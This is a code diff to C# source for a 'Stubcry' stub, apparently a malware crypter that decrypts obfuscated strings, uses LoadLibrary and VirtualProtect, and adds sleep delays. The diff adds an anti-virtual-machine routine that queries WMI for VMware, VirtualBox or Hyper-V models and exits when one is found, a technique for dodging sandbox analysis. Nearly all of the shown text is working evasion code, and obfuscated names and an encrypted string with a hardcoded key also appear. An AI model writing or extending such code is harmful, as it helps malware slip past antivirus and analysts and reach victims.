@@ -12,6 +12,7 @@ using System.Text;
 using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
+using System.Management;
 
 [assembly: AssemblyTitle("#AssemblyProduct")]
 [assembly: AssemblyDescription("#AssemblyDescription")]
@@ -83,6 +84,7 @@ namespace Stubcry
         public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
 
         public static byte[] FOKFILE(string base64Cipher, string base64Key, string base64IV)
         {
@@ -301,6 +303,28 @@ namespace Stubcry
             {
             }
         }
+        private static void DetectVirtualMachine()
+        {
+            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                            || manufacturer.Contains("vmware")
+                            || item["Model"].ToString() == "VirtualBox")
+                        {
+                            MessageBox.Show("vm Check!", "Don t use on vm", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            Environment.Exit(0);
+                        }
+                    }
+                }
+            }
+           
+        }
+
         static void nikamsi()
         {
             IntPtr loadLibrary = LoadLibrary(FOKSTRING("ORQ8cBEtPhQ=", "@mM^gKDz#r4ZpKvI"));
@@ -353,6 +377,10 @@ namespace Stubcry
 
         static string niklhaomha(string zebi)
         {
+            if (config.antivm == true)
+            {
+                DetectVirtualMachine();
+            }
             if (config.issleep == true)
             {
                 Thread.Sleep(config.sleeptime);
